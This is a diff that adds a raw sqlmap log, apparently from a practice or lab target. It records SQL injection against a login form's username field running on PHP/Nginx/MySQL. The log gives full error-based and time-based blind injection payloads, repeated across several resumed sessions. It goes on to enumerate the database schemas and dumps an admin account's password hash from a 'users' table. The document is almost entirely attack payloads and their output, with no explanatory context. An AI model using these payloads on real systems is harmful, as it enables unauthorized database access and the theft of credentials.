@@ -1,0 +1,153 @@
+sqlmap identified the following injection point(s) with a total of 1126 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x7170766271,(SELECT (ELT(3797=3797,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pech&password=foo
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9778 FROM (SELECT(SLEEP(5)))KTeV)-- Guuc&password=foo
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP, Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x7170766271,(SELECT (ELT(3797=3797,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pech&password=foo
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9778 FROM (SELECT(SLEEP(5)))KTeV)-- Guuc&password=foo
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP, Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.0
+current database: 'jetadmin'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x7170766271,(SELECT (ELT(3797=3797,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pech&password=foo
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9778 FROM (SELECT(SLEEP(5)))KTeV)-- Guuc&password=foo
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3, PHP
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x7170766271,(SELECT (ELT(3797=3797,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pech&password=foo
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9778 FROM (SELECT(SLEEP(5)))KTeV)-- Guuc&password=foo
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3, PHP
+back-end DBMS: MySQL >= 5.0.0
+current database: 'jetadmin'
+Database: information_schema
+[61 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+Database: jetadmin
+[1 table]
++---------------------------------------+
+| users                                 |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 3797 FROM(SELECT COUNT(*),CONCAT(0x7170766271,(SELECT (ELT(3797=3797,1))),0x716b7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pech&password=foo
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 9778 FROM (SELECT(SLEEP(5)))KTeV)-- Guuc&password=foo
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP, Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.0
+Database: jetadmin
+Table: users
+[1 entry]
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
++----+------------------------------------------------------------------+----------+
+
